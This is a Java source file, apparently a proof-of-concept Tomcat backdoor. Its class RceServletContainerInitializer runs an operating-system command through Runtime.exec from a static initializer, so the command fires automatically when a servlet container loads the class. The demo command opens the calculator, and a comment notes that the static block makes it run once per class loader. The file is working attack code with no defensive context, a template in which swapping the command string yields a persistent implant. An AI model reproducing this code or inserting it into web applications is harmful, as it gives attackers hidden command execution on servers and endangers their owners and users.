package cc11001100.tomcat.backdoor;

import javax.servlet.ServletContainerInitializer;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import java.io.IOException;
import java.util.Set;

/**
 * <a href="https://docs.oracle.com/javaee/6/api/javax/servlet/ServletContainerInitializer.html">ServletContainerInitializer</a>
 */
public class RceServletContainerInitializer implements ServletContainerInitializer {

    // 使用静态块保证一个ClassLoader只执行一次，因为会被多次加载重复执行
    static {
        rce();
    }

    public void onStartup(Set<Class<?>> set, ServletContext servletContext) throws ServletException {
        // nothing
    }

    private static void rce() {
        String command = "calc";
        try {
            Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

}
